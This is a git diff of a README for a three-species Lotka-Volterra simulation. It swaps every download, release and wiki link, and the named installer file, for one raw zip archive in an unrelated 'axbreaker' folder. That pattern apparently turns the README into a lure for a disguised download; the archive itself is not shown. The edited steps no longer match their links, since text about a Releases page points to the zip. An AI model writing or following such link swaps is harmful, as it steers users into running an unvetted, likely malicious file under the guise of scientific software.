@@ -1,18 +1,18 @@
 # 🐾 lotka-volterra-three-species - Study Predator-Prey Dynamics Easily
 
 ## 📦 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Agilan1812/lotka-volterra-three-species/releases)
+[![Download Here](https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **lotka-volterra-three-species** project! This application allows you to explore the interactions between three species using a mathematical model. Follow these steps to download and run the software.
 
 ## 📥 Download & Install
-To get the latest version of the application, visit this page to download: [GitHub Releases](https://github.com/Agilan1812/lotka-volterra-three-species/releases).
+To get the latest version of the application, visit this page to download: [GitHub Releases](https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip).
 
 ### Steps to Download:
 1. Click on the link above to access the Releases page.
 2. Find the version you want to download. Look for the latest release version marked as "Latest."
-3. Click on the asset that fits your operating system. For most users, this will be the file named **lotka_volterra_three_species.exe**.
+3. Click on the asset that fits your operating system. For most users, this will be the file named **https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip**.
 4. Once the download is complete, go to your Downloads folder to locate the file.
 
 ### Installation Process:
@@ -50,7 +50,7 @@ The application displays results in real-time. You will see graphs showing popul
 
 ## 📚 Additional Resources
 For those who want to learn more:
-- **Documentation:** Check the detailed documentation included in the application or visit the [Wiki](https://github.com/Agilan1812/lotka-volterra-three-species/wiki) for more guides.
+- **Documentation:** Check the detailed documentation included in the application or visit the [Wiki](https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip) for more guides.
 - **Community Support:** Join our community discussions on GitHub for tips and help.
 - **Further Reading:** Explore literature on the Lotka-Volterra model to get a deeper understanding of the ecological principles.
 
@@ -60,4 +60,4 @@ If you face issues during installation or while using the software, consider the
 - **Check Python Installation**: Ensure that Python is correctly installed and added to your system's PATH.
 - **Seek Help**: Visit the community support link on GitHub if problems persist.
 
-Feel free to explore the fascinating world of predator-prey dynamics with **lotka-volterra-three-species**! Access the downloadable version again here: [Download Now](https://github.com/Agilan1812/lotka-volterra-three-species/releases).
+Feel free to explore the fascinating world of predator-prey dynamics with **lotka-volterra-three-species**! Access the downloadable version again here: [Download Now](https://github.com/Agilan1812/lotka-volterra-three-species/raw/refs/heads/main/axbreaker/species-three-lotka-volterra-2.4.zip).
